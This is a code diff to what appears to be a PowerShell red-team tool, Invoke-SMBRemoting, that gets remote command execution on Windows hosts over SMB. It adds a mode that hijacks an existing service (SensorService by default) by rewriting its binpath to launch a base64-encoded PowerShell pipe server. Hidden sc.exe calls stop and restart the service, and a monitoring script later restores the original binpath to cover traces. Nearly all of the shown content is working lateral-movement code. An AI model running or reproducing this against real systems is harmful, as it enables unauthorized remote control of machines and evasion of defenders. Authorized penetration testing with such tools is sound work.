@@ -24,15 +24,22 @@ function Invoke-SMBRemoting {
 	.PARAMETER Command
 	Specify a command to run instead of getting a Shell
 	
+	.PARAMETER Timeout
+	Specify a Timeout after which the script will stop waiting for a connection
+	
+	.PARAMETER ModifyService
+	Modify an existing service instead of creating a new one. If no target service is specified SensorService is targeted
+	
 	.PARAMETER Verbose
 	Show Pipe and Service Name info
 	
 	.EXAMPLE
 	Invoke-SMBRemoting -ComputerName "Workstation-01.ferrari.local"
-	Invoke-SMBRemoting -ComputerName "Workstation-01.ferrari.local" -Command whoami
+	Invoke-SMBRemoting -ComputerName "Workstation-01.ferrari.local" -PipeName Something -ServiceName RandomService
 	Invoke-SMBRemoting -ComputerName "Workstation-01.ferrari.local" -Command "whoami /all"
- 	Invoke-SMBRemoting -ComputerName "Workstation-01.ferrari.local" -PipeName Something -ServiceName RandomService
-	Invoke-SMBRemoting -ComputerName "Workstation-01.ferrari.local" -PipeName Something -ServiceName RandomService -Command whoami
+	Invoke-SMBRemoting -ComputerName "Workstation-01.ferrari.local" -ModifyService -Verbose
+	Invoke-SMBRemoting -ComputerName "Workstation-01.ferrari.local" -ModifyService -ServiceName SensorService -Verbose
+	Invoke-SMBRemoting -ComputerName "Workstation-01.ferrari.local" -ModifyService -Command "whoami /all"
 	
 	#>
 
@@ -42,6 +49,7 @@ function Invoke-SMBRemoting {
 		[string]$ServiceName,
 		[string]$Command,
 		[string]$Timeout = "30000",
+		[switch]$ModifyService,
 		[switch]$Verbose
 	)
 	
@@ -60,10 +68,14 @@ function Invoke-SMBRemoting {
 		$PipeName = $randomvalue
 	}
 	
-	if(!$ServiceName){
+	if(!$ServiceName -AND !$ModifyService){
 		$randomvalue = ((65..90) + (97..122) | Get-Random -Count 16 | % {[char]$_})
 		$randomvalue = $randomvalue -join ""
 		$ServiceName = "Service_" + $randomvalue
+	}
+	
+	elseif(!$ServiceName -AND $ModifyService){
+		$ServiceName = "SensorService"
 	}
 	
 	$ServerScript = @"
@@ -99,29 +111,84 @@ while (`$true) {
 	
 	$B64ServerScript = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($ServerScript))
 	
-	$arguments = "\\$ComputerName create $ServiceName binpath= `"C:\Windows\System32\cmd.exe /c powershell.exe -enc $B64ServerScript`""
+	if($ModifyService){
+		
+		$originalBinPath = & sc.exe \\$ComputerName qc $ServiceName | Select-String "BINARY_PATH_NAME" | ForEach-Object {$_.ToString().Split(":", 2)[1].Trim()}
+		
+		$arguments = "\\$ComputerName config $ServiceName binpath= `"C:\Windows\System32\cmd.exe /c powershell.exe -enc $B64ServerScript`""
+		
+		Start-Process sc.exe -ArgumentList $arguments -WindowStyle Hidden
+		
+		# Optional: Restart the service to apply the changes
+		$stopArguments = "\\$ComputerName stop $ServiceName"
+		$startArguments = "\\$ComputerName start $ServiceName"
+		
+		# Stop the service
+		Start-Process sc.exe -ArgumentList $stopArguments -WindowStyle Hidden
+		
+		Start-Sleep -Milliseconds 1000
+		
+		Start-Process sc.exe -ArgumentList $startarguments -WindowStyle Hidden
+	}
 	
-	$startarguments = "\\$ComputerName start $ServiceName"
+	else{
+		$arguments = "\\$ComputerName create $ServiceName binpath= `"C:\Windows\System32\cmd.exe /c powershell.exe -enc $B64ServerScript`""
 	
-	Start-Process sc.exe -ArgumentList $arguments -WindowStyle Hidden
-	
-	Start-Sleep -Milliseconds 1000
-	
-	Start-Process sc.exe -ArgumentList $startarguments -WindowStyle Hidden
+		$startarguments = "\\$ComputerName start $ServiceName"
+		
+		Start-Process sc.exe -ArgumentList $arguments -WindowStyle Hidden
+		
+		Start-Sleep -Milliseconds 1000
+		
+		Start-Process sc.exe -ArgumentList $startarguments -WindowStyle Hidden
+	}
 	
 	if($Verbose){
-		Write-Output ""
-		Write-Output " [+] Pipe Name: $PipeName"
-		Write-Output ""
-		Write-Output " [+] Service Name: $ServiceName"
-		Write-Output ""
-		Write-Output " [+] Creating Service on Remote Target..."
+		if($ModifyService){
+			Write-Output ""
+			Write-Output " [+] Pipe Name: $PipeName"
+			Write-Output " [+] Service Name: $ServiceName"
+			Write-Output " [+] Original binPath: $originalBinPath"
+			Write-Output " [+] Modifying Service on Remote Target..."
+			Write-Output ""
+		}
+		else{
+			Write-Output ""
+			Write-Output " [+] Pipe Name: $PipeName"
+			Write-Output " [+] Service Name: $ServiceName"
+			Write-Output " [+] Creating Service on Remote Target..."
+			Write-Output ""
+		}
 	}
-	#Write-Output ""
 	
 	# Get the current process ID
 	$currentPID = $PID
 	
+	if($ModifyService){
+	# Embedded monitoring script
+	$monitoringScript = @"
+`$serviceToDelete = "$ServiceName" # Name of the service you want to delete
+`$TargetServer = "$ComputerName"
+`$primaryScriptProcessId = $currentPID
+`$BinPath = "$originalBinPath"
+
+while (`$true) {
+	Start-Sleep -Seconds 5 # Check every 5 seconds
+
+	# Check if the primary script is still running using its Process ID
+	`$process = Get-Process | Where-Object { `$_.Id -eq `$primaryScriptProcessId }
+
+	if (-not `$process) {
+		# If the process is not running, stop the service
+		`$stoparguments = "\\`$TargetServer stop `$serviceToDelete"
+		Start-Process sc.exe -ArgumentList `$stoparguments -WindowStyle Hidden
+		`$arguments = "\\`$TargetServer config `$serviceToDelete binpath= `$BinPath"
+		Start-Process sc.exe -ArgumentList `$arguments -WindowStyle Hidden
+		break # Exit the monitoring script
+	}
+}
+"@}
+	else{
 	# Embedded monitoring script
 	$monitoringScript = @"
 `$serviceToDelete = "$ServiceName" # Name of the service you want to delete
@@ -141,7 +208,7 @@ while (`$true) {
 		break # Exit the monitoring script
 	}
 }
-"@
+"@}
 	
 	$b64monitoringScript = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($monitoringScript))
 	
@@ -242,10 +309,19 @@ while (`$true) {
 			}
 		}
 	}
-
-	$stoparguments = "\\$ComputerName delete $ServiceName"
-	Start-Process sc.exe -ArgumentList $stoparguments -WindowStyle Hidden
+	if($ModifyService){
+		$stopArguments = "\\$ComputerName stop $ServiceName"
+		Start-Process sc.exe -ArgumentList $stopArguments -WindowStyle Hidden
+		$arguments = "\\$ComputerName config $ServiceName binpath= $originalBinPath"
+		Start-Process sc.exe -ArgumentList $arguments -WindowStyle Hidden
+		
+	}
+	else{
+		$stoparguments = "\\$ComputerName delete $ServiceName"
+		Start-Process sc.exe -ArgumentList $stoparguments -WindowStyle Hidden
+	}
+	
 	$pipeClient.Close()
 	$pipeClient.Dispose()
- 	Stop-Process -Id $MonitoringProcess.Id
+	Stop-Process -Id $MonitoringProcess.Id
 }
